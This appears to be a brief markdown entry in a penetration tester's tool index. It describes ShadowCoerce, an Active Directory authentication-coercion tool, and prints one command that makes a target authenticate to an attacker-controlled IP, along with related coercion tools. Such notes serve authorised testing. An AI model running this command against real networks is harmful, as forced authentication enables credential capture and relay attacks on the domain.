---
tags: [tool, activedirectory, coercion]
tool: "shadowcoerce"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# ShadowCoerce - Shadow Copy Coercion

## Tool Overview
Purpose: Coerce authentication via Shadow Copy
Location: ~/tools/activedirectory/ShadowCoerce/shadowcoerce.py

## How to Use It
python3 shadowcoerce.py -d domain.local -u user -p pass -t target-ip -l attacker-ip

## Related Tools
petitpotam, dfscoerce, coercer
